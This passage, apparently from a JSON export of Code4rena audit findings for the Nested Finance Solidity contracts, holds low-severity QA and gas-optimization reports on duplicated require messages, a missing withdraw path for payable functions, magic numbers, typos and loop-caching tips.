INVALID_VAULT\"); operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol:187:        require(pair.factory() == biswapRouter.factory(), \"BLVO: INVALID_VAULT\"); ```  ```solidity operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol:97:        require(amount != 0, \"BLVO: INVALID_AMOUNT\"); operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol:52:        require(amountToDeposit != 0, \"BLVO: INVALID_AMOUNT\"); ```  ```solidity operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol:271:        require(reserveA > 1000, \"BLVO: PAIR_RESERVE_TOO_LOW\"); operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol:272:        require(reserveB > 1000, \"BLVO: PAIR_RESERVE_TOO_LOW\"); ```  ```solidity operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol:54:        require(router != address(0), \"BLVO: INVALID_VAULT\"); operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol:99:        require(router != address(0), \"BLVO: INVALID_VAULT\"); ```  ```solidity operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol:269:        require(reserveA > 1000, \"BLVO: PAIR_RESERVE_TOO_LOW\"); operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol:270:        require(reserveB > 1000, \"BLVO: PAIR_RESERVE_TOO_LOW\"); ```  ```solidity operators/Beefy/BeefyVaultOperator.sol:41:        require(amount != 0, \"BVO: INVALID_AMOUNT\"); operators/Beefy/BeefyVaultOperator.sol:83:        require(amount != 0, \"BVO: INVALID_AMOUNT\"); operators/Beefy/BeefyVaultOperator.sol:96:        require(tokenAmount != 0, \"BVO: INVALID_AMOUNT\"); ```  ```solidity operators/Beefy/BeefyVaultOperator.sol:43:        require(address(token) != address(0), \"BVO: INVALID_VAULT\"); operators/Beefy/BeefyVaultOperator.sol:85:        require(address(token) != address(0), \"BVO: INVALID_VAULT\"); ```  ```solidity operators/Yearn/YearnCurveVaultOperator.sol:70:        require(amount != 0, \"YCVO: INVALID_AMOUNT\"); operators/Yearn/YearnCurveVaultOperator.sol:121:        require(amount != 0, \"YCVO: INVALID_AMOUNT\"); operators/Yearn/YearnCurveVaultOperator.sol:164:        require(amount != 0, \"YCVO: INVALID_AMOUNT\"); operators/Yearn/YearnCurveVaultOperator.sol:212:        require(amount != 0, \"YCVO: INVALID_AMOUNT\"); operators/Yearn/YearnCurveVaultOperator.sol:260:        require(amount != 0, \"YCVO: INVALID_AMOUNT\"); ```  ```solidity operators/Yearn/YearnCurveVaultOperator.sol:73:        require(pool != address(0), \"YCVO: INVALID_VAULT\"); operators/Yearn/YearnCurveVaultOperator.sol:123:        require(pool != address(0), \"YCVO: INVALID_VAULT\"); operators/Yearn/YearnCurveVaultOperator.sol:167:        require(pool != address(0), \"YCVO: INVALID_VAULT\"); operators/Yearn/YearnCurveVaultOperator.sol:215:        require(pool != address(0), \"YCVO: INVALID_VAULT\"); operators/Yearn/YearnCurveVaultOperator.sol:263:        require(pool != address(0), \"YCVO: INVALID_VAULT\"); ```  ```solidity NestedFactory.sol:160:        require(_entryFees != 0, \"NF: ZERO_FEES\"); NestedFactory.sol:168:        require(_exitFees != 0, \"NF: ZERO_FEES\"); ```  ```solidity NestedFactory.sol:161:        require(_entryFees <= 10000, \"NF: FEES_OVERFLOW\"); NestedFactory.sol:169:        require(_exitFees <= 10000, \"NF: FEES_OVERFLOW\"); ```  ```solidity NestedFactory.sol:191:        require(batchedOrdersLength != 0, \"NF: INVALID_MULTI_ORDERS\"); NestedFactory.sol:312:        require(batchedOrdersLength != 0, \"NF: INVALID_MULTI_ORDERS\"); NestedFactory.sol:330:        require(batchedOrdersLength != 0, \"NF: INVALID_MULTI_ORDERS\"); ```  ```solidity NestedFactory.sol:250:        require(_orders.length != 0, \"NF: INVALID_ORDERS\"); NestedFactory.sol:359:        require(batchLength != 0, \"NF: INVALID_ORDERS\"); NestedFactory.sol:406:        require(batchLength != 0, \"NF: INVALID_ORDERS\"); ```  ```solidity NestedFactory.sol:251:        require(tokensLength == _orders.length, \"NF: INPUTS_LENGTH_MUST_MATCH\"); NestedFactory.sol:407:        require(_batchedOrders.amounts.length == batchLength, \"NF: INPUTS_LENGTH_MUST_MATCH\"); ```  ```solidity NestedFactory.sol:252:        require(nestedRecords.getAssetReserve(_nftId) == address(reserve), \"NF: RESERVE_MISMATCH\"); NestedFactory.sol:289:        require(nestedRecords.getAssetReserve(_nftId) == address(reserve), \"NF: RESERVE_MISMATCH\"); NestedFactory.sol:313:        require(nestedRecords.getAssetReserve(_nftId) == address(reserve), \"NF: RESERVE_MISMATCH\"); NestedFactory.sol:331:        require(nestedRecords.getAssetReserve(_nftId) == address(reserve), \"NF: RESERVE_MISMATCH\"); ```  ```solidity NestedFactory.sol:379:        require(amountSpent <= _inputTokenAmount - feesAmount, \"NF: OVERSPENT\"); NestedFactory.sol:428:            require(amountSpent <= _inputTokenAmount, \"NF: OVERSPENT\"); NestedFactory.sol:495:            require(amounts[1] <= _amountToSpend, \"NF: OVERSPENT\"); ```  ```solidity OperatorResolver.sol:39:        require(namesLength == destinations.length, \"OR: INPUTS_LENGTH_MUST_MATCH\"); OperatorResolver.sol:57:        require(names.length == operatorsToImport.length, \"OR: INPUTS_LENGTH_MUST_MATCH\"); ```  ## 5. Funds can be locked  There isn't a withdraw mechanism and several payable methods are implemented:  - BeefyZapBiswapLPVaultOperator.sol:  ```solidity operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol:51:    ) external payable returns (uint256[] memory amounts, address[] memory tokens) { ```  - YearnCurveVaultOperator.sol:  ```solidity operators/Yearn/YearnCurveVaultOperator.sol:69:    ) external payable returns (uint256[] memory amounts, address[] memory tokens) { operators/Yearn/YearnCurveVaultOperator.sol:120:    ) external payable returns (uint256[] memory amounts, address[] memory tokens) { operators/Yearn/YearnCurveVaultOperator.sol:163:    ) external payable returns (uint256[] memory amounts, address[] memory tokens) { operators/Yearn/YearnCurveVaultOperator.sol:211:    ) external payable returns (uint256[] memory amounts, address[] memory tokens) { operators/Yearn/YearnCurveVaultOperator.sol:259:    ) external payable returns (uint256[] memory amounts, address[] memory tokens) { ```  ## 6. A magic number should be documented and explained. Use a `constant` instead  *Similar issue in the past: [here](https://github.com/code-423n4/2021-04-marginswap-findings/issues/71)*  - 1:  ```solidity operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol:240:            1, operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol:251:            1, operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol:252:            1, operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol:240:            1, operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol:251:            1, operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol:252:            1, ```  - 10000:  ```solidity NestedFactory.sol:378:        feesAmount = (amountSpent * entryFees) / 10000; // Entry Fees NestedFactory.sol:443:            feesAmount = (amountBought * (_toReserve ? entryFees : exitFees)) / 10000; ```  I suggest using `constant` variables as this would make the code more maintainable and readable while costing nothing gas-wise (constants are replaced by their value at compile-time).  # Non-Critical Issues  ## 1. It's better to emit after all processing is done  - <https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L374-L378> :  ```solidity contracts/governance/TimelockControllerEmergency.sol:   374      function updateDelay(uint256 newDelay) external virtual {   375          require(msg.sender == address(this), \"TimelockController: caller must be timelock\");   376:         emit MinDelayChange(_minDelay, newDelay);   377          _minDelay = newDelay;   378      } ```  ## 2. Typos  - datas vs data  ```solidity abstracts/MixinOperatorResolver.sol:81:    /// @dev Build the calldata (with safe datas) and call the Operator ```  - setted vs set  ```solidity - abstracts/OwnableProxyDelegation.sol:17:    /// @dev True if the owner is setted + abstracts/OwnableProxyDelegation.sol:17:    /// @dev True if the owner is set ```  - liquitiy vs liquidity  ```solidity libraries/StakingLPVaultHelpers.sol:21:    /// @param pool The Curve pool to add liquitiy in libraries/StakingLPVaultHelpers.sol:52:    /// @param pool The Curve pool to add liquitiy in libraries/StakingLPVaultHelpers.sol:85:    /// @param pool The Curve pool to remove liquitiy from libraries/StakingLPVaultHelpers.sol:115:    /// @param pool The Curve pool to remove liquitiy from ```  - WITHDRAWED vs WITHDREW or WITHDRAWN  ```solidity operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol:108:        require(vaultAmount == amount, \"BLVO: INVALID_AMOUNT_WITHDRAWED\"); operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol:108:        require(vaultAmount == amount, \"BLVO: INVALID_AMOUNT_WITHDRAWED\"); operators/Beefy/BeefyVaultOperator.sol:95:        require(vaultAmount == amount, \"BVO: INVALID_AMOUNT_WITHDRAWED\"); NestedFactory.sol:51:    /// @dev Fees when funds are withdrawed NestedFactory.sol:639:    /// @return The withdrawed amount from the reserve ```  - dont vs don't  ```solidity NestedFactory.sol:477:    /// @dev Call the operator to submit the order but dont stop if the call to the operator fail. ```  - transfered vs transferred  ```solidity NestedFactory.sol:534:    /// @return Token transfered (in case of ETH) ```  ## 3. Adding a `return` statement when the function defines a named return variable, is redundant  While not consuming more gas with the Optimizer enabled: using both named returns and a return statement isn't necessary. Removing one of those can improve code clarity.  Affected code:  ```solidity contracts/governance/TimelockControllerEmergency.sol:   119:     function isOperation(bytes32 id) public view virtual returns (bool pending) {   126:     function isOperationPending(bytes32 id) public view virtual returns (bool pending) {   133:     function isOperationReady(bytes32 id) public view virtual returns (bool ready) {   141:     function isOperationDone(bytes32 id) public view virtual returns (bool done) {   149:     function getTimestamp(bytes32 id) public view virtual returns (uint256 timestamp) {   158:     function getMinDelay() public view virtual returns (uint256 duration) {  contracts/libraries/CurveHelpers/CurveHelpers.sol:   21:     ) internal view returns (uint256[2] memory amounts) {   41:     ) internal view returns (uint256[3] memory amounts) {   61:     ) internal view returns (uint256[4] memory amounts) {   85:     ) internal returns (bool success) { ```  ## 4. `public` functions not called by the contract should be declared `external` instead  ```solidity governance/OwnerProxy.sol:16:    function execute(address _target, bytes memory _data) public payable onlyOwner returns (bytes memory response) { ``` "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/58", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "#1 Use require instead &&  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L66  use require instead of && for efficient gas cost. change it from                require(             address(_nestedAsset) != address(0) &&                 address(_nestedRecords) != address(0) &&                 address(_reserve) != address(0) &&                 address(_feeSplitter) != address(0) &&                 address(_weth) != address(0) &&                 _operatorResolver != address(0) &&                 address(_withdrawer) != address(0),             \"NF: INVALID_ADDRESS\"         );  to                require(address(_nestedAsset) != address(0),\"NF: INVALID_ADDRESS\");               require(address(_nestedRecords) != address(0),\"NF: INVALID_ADDRESS\");               require(address(_reserve) != address(0),\"NF: INVALID_ADDRESS\");               require(address(_feeSplitter) != address(0),\"NF: INVALID_ADDRESS\");               require(address(_weth) != address(0),\"NF: INVALID_ADDRESS\");               require( _operatorResolver != address(0),\"NF: INVALID_ADDRESS\");               require(address(_withdrawer) != address(0),\"NF: INVALID_ADDRESS\");  #2 Change to storage  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L123  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L248  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L466  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/abstracts/MixinOperatorResolver.sol#L52  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/abstracts/MixinOperatorResolver.sol#L101  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/abstracts/MixinOperatorResolver.sol#L33  Use storage instead of  memory to reduce the gas fee.                bytes32[] memory operatorsCache = operators;  to                bytes32[] storage operatorsCache = operators;  apply to others.   #3 Looping  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L124  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L651  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/abstracts/MixinOperatorResolver.sol#L56  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/abstracts/MixinOperatorResolver.sol#L37  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L234  default uint is 0 so remove unnecassary explicit can reduce gas. caching the array length can reduce gas it caused access to a local variable is more cheap than query storage / calldata / memory in solidity. pre increment ++i more cheaper gas than post increment i++. i suggest to use pre increment.  #4 Default value and increment  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L136  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L196  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L315  default uint is 0 so remove unnecassary explicit can reduce gas pre increment ++i more cheaper gas than post increment i++. i suggest to use pre increment.  #5 Inequality  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L286  non strict inequality are cheaper than strict one. i suggest to use >= or <= instead of > and < if possible.  #6 Caching names.length  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/OperatorResolver.sol#L57  caching the names.length can reduce gas it caused access to a local variable is more cheap than query storage / calldata / memory in solidity and it use twice.  #7 Cache the cacheTmp.implementation  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/abstracts/MixinOperatorResolver.sol#L62-L64  cache the cacheTmp.implementation to the memory for reduce the gas fee because it use multiple times.  #8 Use calldata  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/abstracts/MixinOperatorResolver.sol#L93  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/BeefyVaultOperator.sol#L13  In the external functions where the function argument is read-only, the function() has an inputed parameter that using memory, if this function didnt change the parameter, its cheaper to use calldata then memory. so we suggest to change it.  #9 Division  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L275  A division by 2 can be calculated by shifting one to the right. The div opcode used 5 gas and  SHR opcode used 3 gas. Solidity's division operation also includes a division-by-0 prevention by pass using shifting. so i suggest to use >>1.  #10 Sort struct  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Yearn/YearnVaultStorage.sol#L6-L9  shorting the struct can reduce gas cost, so change it from      struct CurvePool {     address poolAddress;     uint96 poolCoinAmount;     address lpToken; to      struct CurvePool {     uint96 poolCoinAmount;     address poolAddress;     address lpToken;  #11 Short the string  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L243-L244  reduce size of string error message to bytes32 for cheap gas if possible.  #12 Caching the targets.length  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L319-L320  caching the targets.length can reduce gas it caused access to a local variable is more cheap than query storage / calldata / memory in solidity and it use twice.          require(targets.length == values.length, \"TimelockController: length mismatch\");         require(targets.length == datas.length, \"TimelockController: length mismatch\");  i suggest to add uint256 _targets = targets.length;               uint256 _targets = targets.length;         require(_targets == values.length, \"TimelockController: length mismatch\");         require(_targets == datas.length, \"TimelockController: length mismatch\"); "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/53", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": " ## Impact  By default, function types and state variables/constants are internal, so the internal keyword can be omitted.  Affected code: 1. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/abstracts/MixinOperatorResolver.sol#L20 2. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/abstracts/OwnableProxyDelegation.sol#L15 3. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L29  ## Proof of Concept      ## Tools Used      ## Recommended Mitigation Steps  --- ## Impact  Consider using IERC20 type instead of address. Or IERC20[] type instead of address[].  Affected code: 1. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L248 2. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L257 3. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L291 4. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L371 5. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L422 6. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L423 7. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L460 8. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L461 9. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L487 10. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L488 11. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L587 12. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L640 13. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/abstracts/MixinOperatorResolver.sol#L91 14. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/abstracts/MixinOperatorResolver.sol#L92 15. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/abstracts/MixinOperatorResolver.sol#L101 16. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/libraries/CurveHelpers/CurveHelpers.sol#L19 17. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/libraries/CurveHelpers/CurveHelpers.sol#L39 18. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/libraries/CurveHelpers/CurveHelpers.sol#L59 19. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/libraries/CurveHelpers/CurveHelpers.sol#L82 20. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/libraries/StakingLPVaultHelpers.sol#L62 21. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/libraries/StakingLPVaultHelpers.sol#L95 22. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/libraries/StakingLPVaultHelpers.sol#L125 23. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/BeefyVaultStorage.sol#L24 24. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L133 25. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L140 26. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L141 27. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L153 28. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L181 29. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L191 30. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L192 31. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L133 32. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L140 33. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L141 34. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L153 35. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L181 36. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L191 37. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L192 38. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Paraswap/ParaswapOperator.sol#L11 39. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Yearn/YearnCurveVaultOperator.sol#L117 40. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Yearn/YearnCurveVaultOperator.sol#L226 41. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Yearn/YearnCurveVaultOperator.sol#L274 42. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Yearn/YearnVaultStorage.sol#L9  ## Proof of Concept      ## Tools Used      ## Recommended Mitigation Steps  --- ## Impact  Consider using \"_\" separate digit capacity i.e \"100000\" could be replaced to \"100_000\". This increases code readability.  Affected code: 1. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L264 2. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L378 3. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L443 4. https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L629  ## Proof of Concept      ## Tools Used      ## Recommended Mitigation Steps  ---"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/49", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "## NestedFactory.sol  ### transferToReserveAndStore: balanceReserveAfter can be inlined  In the `_transferToReserveAndStore` function, we store the reserve balance after the transfer in the `balanceReserveAfter` variable, on line [523](https://github.com/code-423n4/2022-06-nested/blob/b253ed80f67d1bb2a04e1702f5796fd96a7c521e/contracts/NestedFactory.sol#L523).  This variable being only used once, we can inline it and save one mstore.  Recommendation:  ``` nestedRecords.store(_nftId, address(_token), _token.balanceOf(reserveAddr) - balanceReserveBefore, reserveAddr); ```  ## TimelockControllerEmergency.sol  ### scheduleBatch: targets.length should be stored in a variable  In the `scheduleBatch` function on line [221](https://github.com/code-423n4/2022-06-nested/blob/b253ed80f67d1bb2a04e1702f5796fd96a7c521e/contracts/governance/TimelockControllerEmergency.sol#L221), we call `targets.length` to compare the targets length and also to loop through the targets and emit the `CallScheduled` event.  For a better code legibility and also to save some mload, targets length should be stored in a variable.  Recommendation:  ``` uint256 _targetsLength = targets.length;  require(targetsLength == values.length, \"TimelockController: length mismatch\"); require(targetsLength == datas.length, \"TimelockController: length mismatch\");  bytes32 id = hashOperationBatch(targets, values, datas, predecessor, salt); schedule(id, delay); for (uint256 i = 0; i < targetsLength; ++i) {   emit CallScheduled(id, i, targets[i], values[i], datas[i], predecessor, delay); } ```  ### executeBatch: targets.length should be stored in a variable  In the `executeBatch` function on line [312](https://github.com/code-423n4/2022-06-nested/blob/b253ed80f67d1bb2a04e1702f5796fd96a7c521e/contracts/governance/TimelockControllerEmergency.sol#L312), we call `targets.length` to compare the targets length and also to loop through the targets and call the `_call` function.  For a better code legibility and also to save some mload, targets length should be stored in a variable.  Recommendation:  ``` uint256 _targetsLength = targets.length;  require(_targetsLength == values.length, \"TimelockController: length mismatch\"); require(_targetsLength == datas.length, \"TimelockController: length mismatch\");  bytes32 id = hashOperationBatch(targets, values, datas, predecessor, salt); _beforeCall(id, predecessor); for (uint256 i = 0; i < _targetsLength; ++i) {     _call(id, i, targets[i], values[i], datas[i]); } _afterCall(id); ``` "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/45", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "Typos  The same typo (`withdrawed`) occurs in all five lines referenced below:  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L51  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L639  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/BeefyVaultOperator.sol#L95  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L108  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L108  Example:  ```solidity     /// @dev Fees when funds are withdrawed ``` Change `withdrawed` to `withdrawn` in all cases   https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L534 ```solidity     /// @return Token transfered (in case of ETH) ``` Change `transfered` to `transferred`   https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/abstracts/OwnableProxyDelegation.sol#L17 ```solidity     /// @dev True if the owner is setted ``` Change `setted` to `set`   The same typo (`liquitiy`) occurs in all four lines referenced below:  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/libraries/StakingLPVaultHelpers.sol#L21  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/libraries/StakingLPVaultHelpers.sol#L52  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/libraries/StakingLPVaultHelpers.sol#L85  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/libraries/StakingLPVaultHelpers.sol#L115  Example:  